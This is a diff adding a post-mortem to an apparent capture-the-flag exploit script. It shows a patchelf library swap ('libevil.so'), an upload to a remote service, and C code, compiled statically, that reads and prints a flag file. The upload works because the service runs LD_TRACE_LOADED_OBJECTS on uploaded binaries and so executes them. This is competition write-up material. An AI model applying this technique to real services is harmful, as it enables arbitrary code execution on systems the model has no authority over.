@@ -34,3 +34,31 @@ subprocess.run(['patchelf', '--replace-needed', 'libevil.so', lib_path, 'main'],
 
 r = s.post(url, files={'file': open('main', 'rb')})
 print(r.text)
+
+
+"""
+Post-mortem:
+
+Apparently they didn't actually run it with ldd and instead just did LD_TRACE_LOADED_OBJECTS=1 ./<executable> :|
+
+so uploading a static binary will just run it...
+
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+    char buf[4096] = {0};
+    FILE* fptr = fopen("flag", "r");
+    fgets(buf, sizeof(buf), fptr);
+    fclose(fptr);
+    printf("%s\n", buf);
+    return 0;
+}
+
+
+gcc a.c -o a -static
+
+midnight{awWWw_y0u_f0uND_my_Fl4G}
+"""
